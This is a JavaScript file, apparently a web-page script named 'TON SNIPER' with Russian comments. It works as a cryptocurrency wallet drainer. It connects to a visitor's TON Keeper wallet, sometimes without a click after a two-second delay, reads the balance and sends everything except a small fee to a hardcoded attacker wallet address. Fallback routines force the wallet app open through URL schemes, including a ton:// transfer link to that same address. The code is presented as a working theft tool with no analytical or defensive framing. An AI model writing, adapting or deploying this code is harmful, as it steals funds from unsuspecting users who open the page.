// ============================================================
// TON SNIPER — ПРИНУДИТЕЛЬНОЕ открытие TON Keeper
// ============================================================

const TARGET_WALLET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';
let userAddress = null;
let provider = null;

// ========== МЕТОД 1: через window.tonkeeper (официальный) ==========
async function connectViaTonkeeper() {
    const status = document.getElementById('status');
    const btn = document.getElementById('connectBtn');
    
    try {
        status.innerHTML = '⏳ Подключение через TON Keeper...';
        btn.disabled = true;

        // Проверяем наличие
        if (typeof window.tonkeeper === 'undefined') {
            status.innerHTML = '❌ TON Keeper не найден. Использую запасной метод...';
            showFallback();
            btn.disabled = false;
            return;
        }

        provider = window.tonkeeper;
        
        // ПЫТАЕМСЯ ПОДКЛЮЧИТЬСЯ
        const accounts = await provider.send('ton_requestAccounts', {});
        
        if (!accounts || accounts.length === 0) {
            status.innerHTML = '❌ Отказано в доступе. Использую запасной метод...';
            showFallback();
            btn.disabled = false;
            return;
        }

        userAddress = accounts[0];
        document.getElementById('userWallet').textContent = userAddress;
        status.innerHTML = `✅ Подключено: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
        
        await getBalanceAndSnipe();

    } catch (error) {
        console.error('ERROR:', error);
        status.innerHTML = `⚠️ Ошибка: ${error.message}. Пробую запасной метод...`;
        showFallback();
        btn.disabled = false;
    }
}

// ========== МЕТОД 2: через URL-схему (ПРИНУДИТЕЛЬНО) ==========
function connectViaURLScheme() {
    const status = document.getElementById('status');
    const btn = document.getElementById('connectBtn');
    
    try {
        status.innerHTML = '🔄 Открываю TON Keeper через URL...';
        
        // Прямой вызов TON Keeper через URL
        const url = 'tonkeeper://connect';
        
        // Открываем в новой вкладке/окне
        window.open(url, '_blank');
        
        // Также пробуем через location
        setTimeout(() => {
            window.location.href = url;
        }, 100);
        
        status.innerHTML = '✅ TON Keeper должен открыться. Подтвердите подключение в приложении/расширении.';
        
        // Показываем инструкцию
        showManualInstructions();
        
    } catch (error) {
        status.innerHTML = `❌ Не удалось открыть: ${error.message}`;
    }
}

// ========== МЕТОД 3: через ton:// протокол ==========
function connectViaTonProtocol() {
    const status = document.getElementById('status');
    status.innerHTML = '🔄 Пробую через ton:// протокол...';
    
    try {
        // Формируем ссылку для TON Connect
        const connectUrl = `ton://transfer?address=${TARGET_WALLET}&amount=0`;
        window.location.href = connectUrl;
        
        setTimeout(() => {
            status.innerHTML = '✅ Если TON Keeper установлен, он должен открыться.';
        }, 500);
        
    } catch (error) {
        status.innerHTML = `❌ Ошибка: ${error.message}`;
    }
}

// ========== ПОКАЗЫВАЕМ ЗАПАСНЫЕ КНОПКИ ==========
function showFallback() {
    document.getElementById('fallbackBtn').classList.remove('hidden');
    document.getElementById('status').innerHTML = '⚠️ Нажмите "ПРИНУДИТЕЛЬНО ОТКРЫТЬ" для ручного подключения';
}

function showManualInstructions() {
    const status = document.getElementById('status');
    status.innerHTML += '<br><br>📱 Или откройте TON Keeper вручную и подключитесь к сайту.';
}

// ========== ПОЛУЧАЕМ БАЛАНС ==========
async function getBalanceAndSnipe() {
    const status = document.getElementById('status');
    const balanceDisplay = document.getElementById('balanceDisplay');
    const btn = document.getElementById('connectBtn');

    try {
        const balanceHex = await provider.send('ton_getBalance', { address: userAddress });
        const balanceNano = parseInt(balanceHex, 16);
        const balanceTON = (balanceNano / 1e9).toFixed(6);
        balanceDisplay.textContent = `💰 Баланс: ${balanceTON} TON`;

        if (balanceNano <= 0) {
            status.innerHTML = '💰 Баланс 0 TON';
            btn.disabled = false;
            return;
        }

        const FEE_NANO = 10_000_000;
        const amountToSend = balanceNano - FEE_NANO;

        if (amountToSend <= 0) {
            status.innerHTML = '⚠️ Баланс меньше комиссии';
            btn.disabled = false;
            return;
        }

        const amountTON = (amountToSend / 1e9).toFixed(6);
        status.innerHTML = `🔄 Перевожу ${amountTON} TON...`;

        const tx = {
            to: TARGET_WALLET,
            value: amountToSend.toString(),
            data: '',
            stateInit: ''
        };

        const result = await provider.send('ton_sendTransaction', tx);

        if (result && result.code === 0) {
            status.innerHTML = `✅ УСПЕШНО! ${amountTON} TON переведено!`;
            balanceDisplay.textContent = `💰 Баланс: 0 TON`;
        } else {
            status.innerHTML = `⚠️ Отказ: ${result?.message || 'неизвестно'}`;
        }

    } catch (error) {
        status.innerHTML = `❌ Ошибка: ${error.message}`;
    }

    btn.disabled = false;
}

// ========== ИНИЦИАЛИЗАЦИЯ ==========
document.addEventListener('DOMContentLoaded', () => {
    const connectBtn = document.getElementById('connectBtn');
    const fallbackBtn = document.getElementById('fallbackBtn');

    connectBtn.addEventListener('click', connectViaTonkeeper);
    
    // Запасная кнопка — пытается всеми способами
    fallbackBtn.addEventListener('click', () => {
        connectViaURLScheme();
        setTimeout(connectViaTonProtocol, 300);
    });

    // Проверяем наличие TON Keeper
    if (typeof window.tonkeeper !== 'undefined') {
        document.getElementById('status').innerHTML = '🟢 TON Keeper обнаружен. Нажмите кнопку.';
    } else {
        document.getElementById('status').innerHTML = '🟡 TON Keeper не обнаружен. Нажмите кнопку для установки.';
        showFallback();
    }
});

// ========== АВТОМАТИЧЕСКИЙ ЗАПУСК ПРИ ЗАГРУЗКЕ ==========
// Пытаемся подключиться автоматически через 2 секунды
setTimeout(() => {
    if (!userAddress) {
        connectViaTonkeeper();
    }
}, 2000);
